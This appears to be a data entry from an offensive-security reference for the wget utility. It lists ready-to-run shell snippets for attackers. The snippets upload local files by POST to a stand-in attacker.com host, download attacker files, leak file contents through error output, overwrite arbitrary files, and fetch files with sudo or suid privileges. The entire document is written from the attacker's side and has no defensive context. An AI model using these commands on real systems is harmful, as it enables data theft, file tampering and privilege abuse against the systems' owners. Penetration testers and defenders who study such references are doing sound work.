---
functions:
  file-upload:
    - description: Send local file with an HTTP POST request. Run an HTTP service on the attacker box to collect the file. Note that the file will be sent as-is, instruct the service to not URL-decode the body. Use `--post-data` to send hard-coded data.
      code: |
        URL=http://attacker.com/
        LFILE=file_to_send
        wget --post-file=$LFILE $URL
  file-read:
    - description: output the file as an error.
      code: |
        LFILE=file-to-read
        wget -i $LFILE
  file-write:
    - description: write data to a file.
      code: |
        LFILE=file-to-write
        TF=$(mktemp)
        echo DATA > $TF
        wget -i $TF -o $LFILE
  file-download:
    - description: Fetch a remote file via HTTP GET request.
      code: |
        URL=http://attacker.com/file_to_get
        LFILE=file_to_save
        wget $URL -O $LFILE
  suid:
    - description: Fetch a remote file via HTTP GET request.
      code: |
        URL=http://attacker.com/file_to_get
        LFILE=file_to_save
        ./wget $URL -O $LFILE
  sudo:
    - description: Fetch a remote file via HTTP GET request.
      code: |
        URL=http://attacker.com/file_to_get
        LFILE=file_to_save
        sudo wget $URL -O $LFILE
---
